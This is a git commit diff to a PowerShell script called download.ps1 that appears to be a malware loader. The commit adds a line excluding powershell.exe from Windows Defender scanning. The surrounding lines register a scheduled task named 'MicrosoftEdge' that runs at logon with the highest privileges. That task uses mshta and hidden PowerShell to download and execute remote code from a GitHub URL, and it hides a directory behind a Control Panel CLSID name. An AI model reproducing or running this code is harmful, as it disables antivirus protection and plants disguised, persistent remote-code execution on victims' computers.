5445344ca68b0e7c89b71f3c775668ce3e4ac5ae
43a1723 <hai1723notgay@gmail.com>
2025-01-16 12:00:15 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -69,6 +69,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
+Remove-Item -Path "$startupfolder\download.bat" -Force
+Add-MpPreference -ExclusionProcess "powershell.exe"
+
 $task_name = "MicrosoftEdge"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -76,7 +79,7 @@ $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStop
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
-Remove-Item -Path "$startupfolder\download.bat" -Force
+
 
 $rdir = "$env:SystemDrive\ProgramData\Loader"
 $dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
